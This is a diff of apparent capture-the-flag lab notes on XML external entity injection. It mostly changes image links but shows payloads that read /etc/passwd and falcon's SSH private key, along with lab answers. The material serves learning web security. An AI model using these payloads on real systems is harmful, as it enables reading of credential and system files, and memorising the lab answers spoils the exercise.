@@ -192,18 +192,20 @@ On the left side, we can see the burp request that was sent with the URL encoded
 <lastName>&lastname;</lastName>  
 </userInfo>`
 
-![[Pasted image 20210609130544.png]]
+![](Pastedimage20210609130544.png)
 
 2. See if you can read the /etc/passwd
 
-*payload*:
-`
-<?xml version="1.0"?>
-<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
-<root>&read;</root>
-`
+![](Pasted image 20210609130615.png)
 
-![[Pasted image 20210609130615.png]]
+*payload*:
+
+*<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>*
+
+
+
 
 3. What is the name of the user in /etc/passwd
 *falcon*
@@ -214,6 +216,7 @@ On the left side, we can see the burp request that was sent with the URL encoded
 5. What are the first 18 characters for falcon's private key
 
 *payload*:
+
 `
 <?xml version="1.0"?>
 <!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa
@@ -221,5 +224,7 @@ On the left side, we can see the burp request that was sent with the URL encoded
 <root>&read;</root>
 `
 
-![[Pasted image 20210609130832.png]]
+
+
+![](Pastedimage20210609130832.png)
 
